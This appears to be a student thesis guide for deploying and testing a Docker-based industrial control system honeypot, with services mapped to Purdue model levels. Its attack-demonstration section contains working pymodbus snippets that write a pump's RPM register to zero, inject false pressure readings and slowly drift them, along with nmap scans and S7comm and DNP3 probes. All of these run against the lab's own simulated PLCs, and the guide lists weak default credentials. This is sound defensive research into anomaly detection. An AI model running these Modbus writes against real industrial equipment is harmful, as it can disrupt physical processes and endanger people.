# ICS Honeypot — Deployment & Testing Guide

## Architecture Summary (Purdue Model Mapping)

```
┌─────────────────────────────────────────────────────────────────┐
│  LEVEL 3 — Enterprise / Historian (enterprise-net)             │
│  • historian_api  :5000  ← REST API for colleagues/Level-3     │
│  • ics_historian  :8086  ← InfluxDB data store                 │
├─────────────────────────────────────────────────────────────────┤
│  LEVEL 2 — SCADA / Monitoring (monitor-net)                    │
│  • ics_ml_engine  :8000  ← ML anomaly API                      │
│  • ics_grafana    :3000  ← Dashboards                          │
│  • ics_hmi        :8060  ← Operator HMI                        │
├─────────────────────────────────────────────────────────────────┤
│  LEVEL 3.5 — DMZ (dmz-net - externally reachable)             │
│  • plc_simulator  :502   ← Modbus TCP                          │
│  • ics_s7_plc     :102   ← S7comm (Siemens S7-300)            │
│  • ics_dnp3       :20000 ← DNP3                                │
│  • attacker_node         ← Kali Linux (nmap, pymodbus, snap7)  │
├─────────────────────────────────────────────────────────────────┤
│  LEVEL 1/0 — Field Devices (ot-net - internal only)           │
│  • ics_physics_engine    ← Physics simulator (via Redis)       │
│  • ics_state_store       ← Redis (shared process state)        │
└─────────────────────────────────────────────────────────────────┘
```

---

## Prerequisites

| Requirement | Minimum | Recommended |
|-------------|---------|-------------|
| Docker Desktop | v4.x with Compose v2 | Latest |
| RAM | 8 GB | 16 GB |
| CPU Cores | 4 | 8 |
| Disk | 20 GB | 40 GB |
| OS | Windows 10 (WSL2) | Windows 11 / Ubuntu 22.04 |

> **Windows users**: Enable WSL2 backend in Docker Desktop → Settings → General.

---

## Deployment Steps

### 1. Clone and enter the project

```bash
cd "G:\Neutral_Files\GUC\Semester 8\Honeypot"
```

### 2. Build and start all services

```bash
docker compose up --build -d
```

First build takes ~5–10 min (Kali attacker_node is large).
Subsequent starts take ~30 seconds.

### 3. Verify all services are running

```bash
docker compose ps
```

Expected: all 14 services should show `running`.

### 4. Check ML engine grace period

```bash
# Watch ML engine logs — no anomaly alerts for first 120s
docker logs -f ics_ml_engine
```

Look for:
```
--- ML ENGINE v2 STARTING [session=XXXX] ---
    Grace period: 120s, CUSUM threshold: 40.0
[ML] Entering main detection loop. Grace period ends in 120s.
```

---

## Service Access Points

| Service | URL | Credentials |
|---------|-----|-------------|
| **Grafana** | http://localhost:3000 | admin / admin |
| **HMI** | http://localhost:8060 | — |
| **InfluxDB** | http://localhost:8086 | admin / password123 |
| **ML Engine API** | http://localhost:8001/health | — |
| **ML Engine Alerts** | http://localhost:8001/alerts | — |
| **Historian API** | http://localhost:5001/api/health | — |
| **Historian Alerts** | http://localhost:5001/api/alerts | — |
| **Historian Summary** | http://localhost:5001/api/summary | — |

---

## Real Attack Demonstrations (Booth)

### Scenario 1: Port Scan with Nmap (from attacker_node)

```bash
# Open a shell into the Kali attacker node
docker exec -it attacker_node bash

# Scan all three ICS ports
nmap -sV -p 502,102,20000 plc_simulator ics_s7_plc ics_dnp3

# Or scan the host IP from a VM on the same network
nmap -sV -p 502,102,20000 <HOST_IP>
```

Expected output:
```
PORT      STATE SERVICE  VERSION
102/tcp   open  iso-tsap Siemens S7 PLC
502/tcp   open  modbus   Modbus protocol
20000/tcp open  dnp      DNP3 protocol
```

### Scenario 2: Modbus Write Attack (pump RPM override)

```bash
# From your host (venv) or attacker_node
python attack_simulation.py
```

Or manually with pymodbus:

```bash
docker exec -it attacker_node python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('plc_simulator', port=502)
c.connect()
# Override pump RPM to 0 (shutdown)
c.write_register(200, 0)
print('Written: pump RPM = 0')
c.close()
"
```

### Scenario 3: Semantic Injection (write to read-only sensor registers)

```bash
docker exec -it attacker_node python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('plc_simulator', port=502)
c.connect()
# Inject fake pressure reading (register 100)
c.write_register(100, 9999)
print('Injected: pressure = 9999 PSI')
c.close()
"
```
→ ML engine detects as **SEMANTIC_INJECTION** within ~10s.

### Scenario 4: S7comm Probe

```bash
docker exec -it attacker_node python3 /tools/s7comm_probe.py ics_s7_plc 102
```

### Scenario 5: DNP3 Flood

```bash
docker exec -it attacker_node python3 /tools/dnp3_probe.py ics_dnp3 20000
```

### Scenario 6: Stealth Drift (slow pressure manipulation)

```bash
# Gradually ramp pressure — EWMA/CUSUM detects after ~30s of sustained drift
docker exec -it attacker_node python3 -c "
from pymodbus.client import ModbusTcpClient
import time
c = ModbusTcpClient('plc_simulator', port=502)
c.connect()
for i in range(20):
    c.write_register(100, 50 + i*5)   # 50 → 145 PSI over 20 iterations
    print(f'Drifting: {50 + i*5} PSI')
    time.sleep(2)
c.close()
"
```

---

## Consuming the Alert API (Level 3 Integration)

Your colleagues working on Level 3 can call:

```bash
# Health check
curl http://localhost:5000/api/health

# Get all alerts from last hour (JSON)
curl http://localhost:5000/api/alerts

# Get only semantic injection alerts
curl "http://localhost:5000/api/alerts?alert_type=SEMANTIC_INJECTION"

# Get full dashboard summary (for thesis table generation)
curl http://localhost:5000/api/summary

# Push an external event from a Level-3 IDS
curl -X POST http://localhost:5001/api/external-event \
  -H "Content-Type: application/json" \
  -d '{"event_type":"IDS_ALERT","source":"snort","detail":"SYN flood on port 502","severity":"HIGH"}'
```

```bash
# Live ML engine metrics (direct)
curl http://localhost:8000/metrics

# Force model retrain
curl -X POST http://localhost:8000/reset-model
```

---

## Thesis Testing Protocol

### Data Collection Per Scenario

For each test scenario:

1. **Start fresh** — `docker compose restart` → wait 3 min (grace + warmup finish).
2. **Record baseline** — Wait 5 min with no attacks → export Grafana "Security Metrics" panel.
3. **Execute attack** — Run the attack command above.
4. **Record detection** — Export Grafana panel 5 min post-attack.
5. **Save raw data** — `curl http://localhost:5000/api/summary > scenario_X_results.json`

### Metrics to Report in Thesis

| Metric | Where | How |
|--------|-------|-----|
| True Positive Rate | `security_alerts` count vs attacks launched | Manual |
| False Positive Rate | Alerts during 10-min clean baseline | Grafana |
| Detection Latency | Time from attack to first alert | Grafana timestamp diff |
| Alert Types | `security_alerts.alert_type` | `/api/summary` |
| Protocol Events | `honeypot_events` by protocol | Grafana |

### Suggested Test Matrix

| Scenario | Expected Alert Type | Typical Detection Latency |
|----------|--------------------|-----------------------------|
| Nmap scan | honeypot_events (recon) | Immediate |
| Modbus RPM write | correlation_logs + CROSS_LAYER | ~10s |
| Semantic injection | SEMANTIC_INJECTION | ~10s |
| S7comm probe | honeypot_events (S7comm) | Immediate |
| DNP3 connection | auth_attempts (DNP3) | Immediate |
| Stealth drift | STEALTH_DRIFT_EWMA | 30–60s |

---

## Stopping the Deployment

```bash
# Stop all containers (keeps data)
docker compose down

# Stop and DELETE all data (fresh start)
docker compose down -v
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| ML engine shows anomaly on startup | Wait — grace period is 120s. Check `docker logs ics_ml_engine` |
| Port 502 already in use | `netstat -an | findstr 502` → kill the process |
| attacker_node takes too long to build | Use `--no-cache` or pre-pull `kalilinux/kali-rolling` |
| Grafana shows no data | Wait 3 min for first pipeline_metrics to accumulate |
| historian_api can't reach ml_engine | Both need `monitor-net` — check `docker compose ps` |
